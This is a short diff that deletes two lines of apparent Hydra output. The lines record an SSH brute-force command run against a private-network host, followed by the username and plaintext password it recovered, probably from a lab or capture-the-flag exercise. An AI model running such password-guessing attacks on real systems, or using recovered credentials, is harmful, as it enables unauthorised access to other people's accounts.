@@ -1,2 +1,0 @@
-# Hydra v9.1 run at 2021-01-09 07:28:25 on 192.168.88.226 ssh (hydra -L logins.txt -P passwords.txt -o found.txt 192.168.88.226 ssh)
-[22][ssh] host: 192.168.88.226   login: commando   password: c0mmandosArentRea1.!
